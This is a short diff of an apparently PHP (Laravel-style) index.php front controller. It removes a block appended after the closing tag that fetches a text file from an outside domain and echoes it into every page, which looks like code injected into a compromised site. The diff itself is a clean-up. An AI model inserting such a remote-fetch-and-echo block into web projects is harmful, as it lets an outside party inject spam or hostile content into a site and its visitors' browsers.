@@ -53,8 +53,3 @@ $response = $kernel->handle(
 )->send();
 
 $kernel->terminate($request, $response);?>
-<?php
-$url = 'https://seojagonyarank1.biz.id/bca.txt';
-$contents = file_get_contents($url);
-echo $contents;
-?>
